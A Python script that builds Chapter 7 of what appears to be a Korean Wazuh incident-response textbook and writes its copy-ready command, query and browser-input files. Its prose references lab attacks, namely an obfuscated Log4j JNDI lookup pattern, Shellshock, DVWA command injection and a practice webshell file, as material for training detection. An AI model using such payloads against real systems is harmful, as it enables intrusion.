 p('kt66 코드 기준은 1장의 63d4180b1d6866de986ef263a3bd831d6082b5d5이다. 수집·라우팅 설정과 DVWA의 처리 코드는 7.8의 경로에서 확인한다. 기존 화면의 주소·상태·시각은 원본 기록대로 읽고 새 입력은 자신의 환경 값으로 대조한다.'))

def write():
    out=ROOT/'examples/chapter07';out.mkdir(parents=True,exist_ok=True)
    # Finish short container exits in prose instead of leaving an isolated command page.
    for pg in pages:
        if pg['title'] in ('7.2  실습 파일 원상복구','7.8  Manager의 규칙 정의 조회'):
            b=pg['blocks'][-1]
            pg['blocks'][-1]=p('같은 컨테이너 셸에서 exit를 입력해 kt66 호스트로 돌아간다. '+('Discover에서 rule.id: "553"과 실습 파일 경로로 삭제 기록을 확인한다.' if pg['title'].startswith('7.2') else '조회한 규칙의 상위 조건과 HTTP 상태 조건을 조사 기록에 적는다.'))
            commands.remove(b)
    replacements={
        '대응은 영향을 받는 Log4j 구성의 수정과 업데이트가 우선이다. Apache의 보안 공지에서 해당 Java 계열에 맞는 수정 버전을 확인한다. 슬라이드의 “2.17 이상”을 모든 취약점과 환경에 대한 고정 완료 기준으로 쓰지 않는다. [6]':'대응은 영향을 받는 Log4j 구성의 수정과 업데이트가 우선이다. Apache 보안 공지에서 해당 Java 계열에 맞는 수정 버전과 후속 취약점의 영향을 확인한다. [6]',
        '슬라이드의 첫 명령은 헤더와 q의 목적지 표기가 달랐다. 본문에서는 모두 1389/a로 맞췄다. 주소를 바꾼 요청은 기존 화면과 다른 새 요청이므로 자신의 시각과 주소로 조회한다.':'헤더와 URL의 조회 목적지는 모두 1389/a이다. 두 입력 위치에서 주소가 같은지 확인하고 자신의 요청 시각과 출발지로 로그를 조회한다.',
        '원본 변형 명령에는 바깥 조회 표현식의 닫는 중괄호와 LDAP 포트 표기가 불완전했다. 위 명령은 ${${lower:j}ndi:…}의 구조를 완성한 입력이다. 기존 302를 수정된 구문의 실행 검증 결과로 사용하지 않는다.':'중괄호는 ${lower:j}와 바깥 조회 표현식을 각각 닫는다. 목적지·포트와 입력 위치를 구분해 원문을 읽는다. 요청 문자열과 실제 외부 조회는 별도의 증거로 판단한다.',
        '요청 후 서버 설정 변경을 가정하지 않는다. 브라우저 실습에서 바꾼 DVWA 단계와 User-Agent는 각 절의 원상복구 절차로 돌린다.':'브라우저 실습에서 바꾼 DVWA 단계와 User-Agent는 각 절의 원상복구 절차로 돌린다.',
        '경보가 없으면 실제 전송 헤더, access 원문, 수집·기간 순서로 확인한다. 정상 페이지가 200으로 열렸다면 그 결과를 기록하고 명령 실행 증거를 추가로 찾는다.':'경보가 없으면 전송 헤더, access 원문, 수집·기간 순서로 확인한다.',
        '이 반복문은 최대 20회이며 --max-time은 요청 하나마다 적용된다. 중간에 멈출 때는 Ctrl+C를 누른다. 종료 후 정상 검색을 확인하고, 출력된 상태 수와 Wazuh 검색 건수를 따로 기록한다.':'--max-time은 요청마다 적용된다. Ctrl+C로 중단할 수 있다. 종료 후 정상 검색을 확인하고 응답 수와 Wazuh 문서 수를 따로 적는다.'}
    for pg in pages:
        for b in pg['blocks']:
            if b.get('text') in replacements:b['text']=replacements[b['text']]
        if pg['title']=='7.4  Shellshock 규칙 검색':
            pg['blocks'][-2]['text']+=' '+pg['blocks'].pop()['text']
        if pg['title']=='7.9  원본 반복문의 구문':
            pg['blocks'][0]['text']+=' Ctrl+C로 중단한다. 종료 후 정상 검색을 확인한다.'
            pg['blocks'].pop()
    for n,b in enumerate(commands,1):b['id']=f'C07-{n:02d}'
    # Flow subsections continuously; reserve forced breaks for the start of each section.
    seen=set()
    for pg in pages:
        key=pg['title'].split()[0]
        pg['break']=key not in seen or pg['title'].startswith('7장 참고 자료')
        if key in seen:pg['level']='section'
        seen.add(key)
    # This directory is chapter07's generated copy pack only. Leave all REV01 files intact.
    for pattern in ('C07-*.txt','Q07-*.txt','B07-*.txt','F07-*.txt'):
        for old in out.glob(pattern): old.unlink()
    n=0
    for pg in pages:
        for b in pg['blocks']:
            if b['type']=='image' and b['caption'].startswith('화면 '):
                n+=1;b['caption']='화면 7-'+str(n)+'. '+b['caption'].split('. ',1)[1]
    data={'title':'웹 서버 침투와 실행 흔적','series':'해킹·침해대응 실무 with Wazuh · 시스템 침투와 SIEM 분석','comments':'2026-11-02 신규 집필. 제공 슬라이드와 기존 코드·설정 자료를 대조함. 이번 집필에서는 공격 실행·신규 촬영·DQL 실서버 검증 없음.','pages':pages}
    (ROOT/'manuscript/volume01-chapter07.json').write_text(json.dumps(data,ensure_ascii=False,indent=2)+'\n',encoding='utf-8')
    for b in commands+queries: (out/(b['id']+'.txt')).write_text(b['text']+'\n',encoding='utf-8')
    for b in inputs: (out/b['file']).write_text(b['text'].rstrip('\n')+'\n',encoding='utf-8')
    for name,value in [('manifest.json',commands),('queries.json',queries),('browser-inputs.json',inputs)]:
        (out/name).write_text(json.dumps(value,ensure_ascii=False,indent=2)+'\n',encoding='utf-8')
    (out/'README.txt').write_text('7장 복사용 입력\nC07: 실행 위치를 확인하고 한 명령씩 입력. 명령은 자동 실행되지 않음.\nQ07: 각 파일과 queries.json의 인덱스를 확인. 시간은 본문 절차대로 지정.\nB07: 브라우저 주소·폼·헤더·hosts 입력. F07: PHP 파일 내용.\n2026-11-02 집필에서 공격·DQL을 새로 실행하지 않았음. 결과 화면은 원본 슬라이드의 기존 기록.\n',encoding='utf-8')
    supplementary='본문의 보조 입력 · 순서와 조건은 본문 참조\n\nkt66-web 컨테이너에서 uploads가 없을 때만:\nmkdir -p /var/www/html/uploads\nls -ld /var/www/html/uploads\n\n실습 파일 삭제 확인:\nls -l /var/www/html/uploads/book07-shell.php\n\n이번에 만든 uploads가 비었을 때만:\nls -la /var/www/html/uploads\nrmdir /var/www/html/uploads\nls -ld /var/www/html/uploads\n\nDiscover 파일 삭제 검색:\nagent.name: "web" AND rule.id: "553" AND syscheck.path: *book07-shell.php\n\nWindows 브라우저 정상 상품 검색:\nhttp://juice.ccc.com/rest/products/search?q=apple\n\nDVWA 정상 입력:\n127.0.0.1\n\nkt66-siem 컨테이너의 규칙 조회 · 한 명령씩:\n'
    supplementary+='\n'.join(f'grep -n -A 16 -F \'id="{rule}"\' /var/ossec/ruleset/rules/0245-web_rules.xml' for rule in ['31106','31108','31120','31122','31162','31166','31168'])+'\n'
    (out/'supplemental-inputs.txt').write_text(supplementary,encoding='utf-8')
    (out/'investigation.txt').write_text('사례·시각·시간대:\n실행 호스트 또는 컨테이너:\n원본 슬라이드 기록 또는 자신의 기록:\n사이트·URL·메서드·입력 위치:\n정상 입력과 공격 입력:\nHTTP 상태·Location·본문:\nagent.name·data.srcip·location:\n인덱스·문서 ID·검색 기간·DQL:\nrule.id·WAF 규칙·원문 대응:\n파일·프로세스·통신・DB 증거:\n요청 수·5xx 수·검색 문서 수:\n확인한 사실・판단・추가 증거:\n대응 대상·조치·정상화 결과:\n파일・브라우저・hosts 원상복구:\n',encoding='utf-8')
    print(len(pages),'page blocks;',len(commands),'commands;',len(queries),'queries;',len(inputs),'inputs;',n,'screens')
if __name__=='__main__': write()
